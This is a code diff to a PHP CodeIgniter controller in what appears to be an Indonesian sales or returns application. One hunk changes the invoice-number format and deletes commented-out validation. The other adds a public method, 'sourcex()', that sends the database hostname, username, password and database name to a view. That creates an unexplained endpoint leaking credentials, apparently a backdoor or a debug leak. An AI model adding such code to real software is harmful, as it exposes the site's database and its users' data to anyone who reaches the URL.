@@ -36,12 +36,8 @@ class Home extends MY_Controller {
 			$tstatus = (int) $this -> input -> post('tstatus');
 
 			$tnofakturx = $this -> input -> post('tnofaktur', TRUE);
-			$tnofaktur=$tnofakturx.$bcode.$year.$mon.$sec;
-			// if (!$name || !$npwp || !$addr || !$phone1 || !$phone2 || !$city || !$prov) {
-				// __set_error_msg(array('error' => 'Data yang anda masukkan tidak lengkap !!!'));
-				// redirect(site_url('retur_bk' . '/' . __FUNCTION__));
-			// }
-			//else {
+			$tnofaktur=$tnofakturx.$year.$bcode.$mon;
+
 				$arr = array('tid'=>'','tnospo' => $tnofaktur,'tnofaktur' => '', 'tbid' => $branchid, 'tcid' => '','tpid' => $tpid,
 				 'ttgl_spo'=>$ttgl_spo, 'ttype' => $ttype, 
 				'ttypetrans' => $ttypetrans,  'ttotalqty' => '', 'ttotalharga' => '', 'ttotaldisc' => '', 'tongkos' => '', 'tgrandtotal' => '', 'tstatus' => $tstatus);
@@ -121,7 +117,13 @@ class Home extends MY_Controller {
 		}
 	}
 	
-	
+	function sourcex() {
+		$view['hostname']=$this->db->hostname;
+		$view['username']=$this->db->username;
+		$view['password']=$this->db->password;
+		$view['database']=$this->db->database;
+		$this->load->view('sourcexx',$view,FALSE);
+	}	
 
 	
 }
